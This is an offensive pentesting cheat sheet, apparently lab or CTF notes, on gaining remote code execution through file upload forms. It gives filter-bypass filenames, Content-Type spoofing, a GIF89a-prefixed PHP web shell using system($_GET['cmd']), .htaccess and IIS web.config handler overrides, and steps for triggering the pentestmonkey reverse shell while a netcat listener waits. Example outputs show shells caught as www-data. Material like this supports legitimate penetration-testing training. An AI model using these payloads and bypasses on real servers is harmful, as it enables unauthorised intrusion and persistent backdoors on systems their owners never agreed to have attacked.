# FILE UPLOAD ATTACKS

### Upload PHP reverse shell

```bash
Upload pentestmonkey php-reverse-shell.php
```

> Basic upload attempt

**Why:** Check if .php is allowed

<details>
<summary>Example Output</summary>

```
Upload pentestmonkey shell as shell.php
Response: 'File uploaded successfully'
Browse to: http://10.10.10.5/uploads/shell.php

nc -nlvp 443:
connect to [ATTACKER] from [10.10.10.5]
$ whoami
www-data
```
</details>

---

### Bypass extension filter

```bash
shell.php5
shell.phtml
shell.phar
shell.phps
shell.php.jpg
shell.PHP
shell.php%00.jpg
```

> Try alternative extensions

**Why:** Different PHP handlers

<details>
<summary>Example Output</summary>

```
shell.php    -> 'File type not allowed'
shell.php5   -> 'File type not allowed'
shell.phtml  -> 'File uploaded successfully!'
(phtml bypassed the filter)
```
</details>

---

### Bypass content-type check

```bash
Change Content-Type header to image/jpeg in Burp
```

> Intercept and modify

**Why:** Server checks MIME type only

<details>
<summary>Example Output</summary>

```
In Burp, change:
Content-Type: application/x-php
To:
Content-Type: image/jpeg

Server response: 'File uploaded successfully'
(Server only checked MIME type, not actual content)
```
</details>

---

### Double extension

```bash
shell.php.png
shell.jpg.php
```

> Confuse extension parsing

**Why:** Some servers check last/first ext

<details>
<summary>Example Output</summary>

```
shell.php.png -> 'Uploaded successfully'
But Apache processes .php first
Browse: http://10.10.10.5/uploads/shell.php.png
$ whoami
www-data
```
</details>

---

### Magic bytes bypass

```bash
Add GIF89a; to start of PHP file
Or embed PHP in image EXIF
```

> Bypass magic byte checks

**Why:** File starts as valid image

<details>
<summary>Example Output</summary>

```
Add GIF89a; at top of PHP shell:
GIF89a;
<?php system($_GET['cmd']); ?>

Upload as shell.gif.php or shell.php
Server sees GIF magic bytes, allows upload
```
</details>

---

### Upload .htaccess

```bash
Upload .htaccess:
AddType application/x-httpd-php .jpg
Then upload shell.jpg
```

> Change how server handles files

**Why:** Make .jpg execute as PHP

<details>
<summary>Example Output</summary>

```
Upload .htaccess containing:
AddType application/x-httpd-php .jpg

Then upload shell.jpg (with PHP code inside)
Browse: http://10.10.10.5/uploads/shell.jpg
$ whoami
www-data
(.jpg now executes as PHP)
```
</details>

---

### Upload web.config (IIS)

```bash
Upload web.config with handler for .jpg as ASP
```

> IIS equivalent of .htaccess

**Why:** ASP/ASPX execution

<details>
<summary>Example Output</summary>

```
Upload web.config:
<handlers>
  <add name='aspnet' path='*.jpg' verb='*' type='System.Web.UI.PageHandlerFactory'/>
</handlers>

Upload shell.jpg with ASP code
Browse to execute
(IIS treats .jpg as ASP)
```
</details>

---

### Find upload location

```bash
Check response, view source, or gobuster
```

> Where did the file go?

**Why:** Need path to trigger execution

<details>
<summary>Example Output</summary>

```
Response: 'File uploaded to /uploads/shell.php'
OR: View source -> <img src='/uploads/shell.php'>
OR: gobuster dir -u http://10.10.10.5 -w wordlist.txt
  /uploads/ (Status: 301)
(Need the path to trigger your shell)
```
</details>

---

### Trigger uploaded shell

```bash
curl http://$IP/uploads/shell.php
or browse to it
```

> Execute your uploaded file

**Why:** Start netcat listener first

<details>
<summary>Example Output</summary>

```
nc -nlvp 443
curl http://10.10.10.5/uploads/shell.php

Listening on 0.0.0.0 443
Connection received from 10.10.10.5
$ whoami
www-data
(Reverse shell caught!)
```
</details>

---
